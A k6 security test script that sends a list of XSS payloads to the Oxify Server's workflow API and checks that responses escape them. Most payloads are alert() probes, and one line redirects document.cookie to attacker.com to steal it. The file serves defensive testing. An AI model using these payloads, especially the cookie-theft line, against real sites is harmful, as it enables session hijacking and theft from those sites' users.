// Cross-Site Scripting (XSS) Security Test for Oxify Server
// Tests for XSS vulnerabilities (OWASP A03:2021)
//
// Usage: k6 run tests/security/xss-test.js

import http from 'k6/http';
import { check, group } from 'k6';
import { Rate } from 'k6/metrics';

const vulnerableRate = new Rate('vulnerable');
const TARGET_URL = __ENV.TARGET_URL || 'http://localhost:8080';

export const options = {
    vus: 1,
    duration: '30s',
    thresholds: {
        'vulnerable': ['rate==0'], // No vulnerabilities should be found
    },
};

// Common XSS payloads
const XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror='alert(1)'>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script>String.fromCharCode(88,83,83)</script>",
];

export default function () {
    group('XSS Tests', function () {
        XSS_PAYLOADS.forEach((payload, index) => {
            // Test query parameters
            const url = `${TARGET_URL}/api/workflows?name=${encodeURIComponent(payload)}`;
            const res1 = http.get(url);

            const vulnerable1 = check(res1, {
                'payload not reflected unescaped': (r) => {
                    return !r.body.includes(payload);
                },
                'HTML entities properly escaped': (r) => {
                    // Check if < and > are escaped
                    return !(
                        r.body.includes('<script>') ||
                        r.body.includes('<img') ||
                        r.body.includes('onerror=') ||
                        r.body.includes('onload=') ||
                        r.body.includes('onfocus=')
                    );
                },
                'proper content type': (r) => {
                    const contentType = r.headers['Content-Type'] || '';
                    return contentType.includes('application/json') || contentType.includes('text/plain');
                },
            });

            vulnerableRate.add(!vulnerable1);

            // Test POST body
            const res2 = http.post(`${TARGET_URL}/api/workflows`, JSON.stringify({
                name: payload,
                description: payload,
            }), {
                headers: { 'Content-Type': 'application/json' },
            });

            const vulnerable2 = check(res2, {
                'XSS payload sanitized in response': (r) => {
                    return !(
                        r.body.includes('<script') ||
                        r.body.includes('javascript:') ||
                        r.body.includes('onerror=') ||
                        r.body.includes('onload=')
                    );
                },
            });

            vulnerableRate.add(!vulnerable2);
        });
    });
}

export function handleSummary(data) {
    const vulnerableCount = data.metrics.vulnerable.values.count || 0;
    const totalTests = XSS_PAYLOADS.length * 2;

    console.log(`\n=== XSS Security Test Summary ===`);
    console.log(`Total Tests: ${totalTests}`);
    console.log(`Vulnerabilities Found: ${vulnerableCount}`);
    console.log(`Status: ${vulnerableCount === 0 ? '✅ PASS' : '❌ FAIL'}`);
    console.log(`=================================\n`);

    return {
        'stdout': JSON.stringify(data, null, 2),
        'xss-report.json': JSON.stringify(data),
    };
}
